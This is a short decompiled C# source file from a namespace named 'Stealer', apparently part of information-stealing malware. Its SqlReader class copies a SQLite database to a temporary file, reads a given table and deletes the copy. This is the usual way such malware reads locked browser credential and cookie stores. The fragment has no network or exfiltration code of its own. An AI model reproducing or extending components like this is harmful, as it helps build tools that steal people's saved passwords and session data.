using System;
using System.IO;

namespace Stealer
{
	// Token: 0x02000016 RID: 22
	internal sealed class SqlReader
	{
		// Token: 0x06000077 RID: 119 RVA: 0x000055C4 File Offset: 0x000037C4
		public static SQLite ReadTable(string database, string table)
		{
			bool flag = !File.Exists(database);
			SQLite sqlite;
			if (flag)
			{
				sqlite = null;
			}
			else
			{
				string text = Path.GetTempFileName() + ".dat";
				File.Copy(database, text);
				SQLite sqlite2 = new SQLite(text);
				sqlite2.ReadTable(table);
				File.Delete(text);
				bool flag2 = sqlite2.GetRowCount() == 65536;
				if (flag2)
				{
					sqlite = null;
				}
				else
				{
					sqlite = sqlite2;
				}
			}
			return sqlite;
		}
	}
}
